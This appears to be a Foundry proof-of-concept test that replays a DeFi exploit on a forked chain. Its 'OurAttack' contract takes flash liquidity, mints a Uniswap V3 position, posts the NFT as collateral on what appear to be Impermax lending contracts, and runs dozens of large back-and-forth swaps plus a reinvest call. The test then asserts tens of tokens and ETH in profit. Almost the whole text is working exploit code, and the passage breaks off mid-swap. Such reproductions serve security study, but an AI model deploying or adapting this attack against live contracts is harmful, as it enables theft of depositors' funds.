
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 29437438;
    uint256 constant TX_TIMESTAMP = 1745664225;
    uint256 constant TX_BLOCK_NUMBER = 29437439;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.imxB, "imxB", 43827965774795003106);
        _expectProfit(Addresses.A_E9F853_24CD, address(0), Addresses.ZERO, "ETH", 34596457958884485813);
    }
}

contract OurAttack {
    function attack() external payable {
        borrowFlashLiquidity();
    }

    function acceptNftCallback() internal {
        _replayDone[REPLAY_NFT_CB] = true;
    }

    function flashCallback() internal {
        _replayDone[REPLAY_BALANCE_OF_ATTACK_CONTRACT_1] = true;
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
        flashCallback16();
        flashCallback17();
        flashCallback18();
        flashCallback19();
        flashCallback20();
        flashCallback21();
        flashCallback22();
        flashCallback23();
        flashCallback24();
        flashCallback25();
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        IImpermaxBorrow(Addresses.imxB).totalBorrows();
        IImpermaxBorrow(Addresses.imxB).debtCeiling();
        IERC20Like(Addresses.WETH).balanceOf(Addresses.imxB);
        IPrimaryPool(Addresses.A_1C450D_F608).tickSpacing();
        IPrimaryPool(Addresses.A_1C450D_F608).slot0();
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(1000000000),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608).slot0();
        IImpermaxColl(Addresses.imxC).safetyMarginSqrt();
        IPrimaryPool(Addresses.A_1C450D_F608)
            .mint(
                Addresses.NFT_UNI_V3,
                int24(-196216),
                int24(-102028),
                uint128(3315194000212825),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        {
            (bool ok,) = Addresses.NFT_UNI_V3
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x96228165),
                        address(this),
                        200,
                        115792089237316195423570985008687907853269984665640564039457584007913129443720,
                        115792089237316195423570985008687907853269984665640564039457584007913129537908
                    )
                );
            require(ok, "call 0x96228165 failed");
        }
        {
            if (IERC721Like(Addresses.NFT_UNI_V3).ownerOf(255) == address(this)) {
                IERC721Like(Addresses.NFT_UNI_V3).transferFrom(address(this), Addresses.imxC, 255);
            }
        }
        {
            (bool ok,) = Addresses.imxC.call(abi.encodeWithSelector(bytes4(0x40c10f19), address(this), 255));
            require(ok, "call 0x40c10f19 failed");
        }
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback4() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(400080026003),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        INftUniV3(Addresses.NFT_UNI_V3).reinvest(255, address(this));
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback5() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback6() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback7() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback8() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback9() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback10() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback11() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback12() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback13() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback14() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
    }

    function flashCallback15() internal {
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
                int256(19403880776155),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                true,
                int256(-19400000000000),
                uint160(4295128740),
                abi.encode(Addresses.WETH, Addresses.USDC)
            );
        IPrimaryPool(Addresses.A_1C450D_F608)
            .swap(
                address(this),
                false,
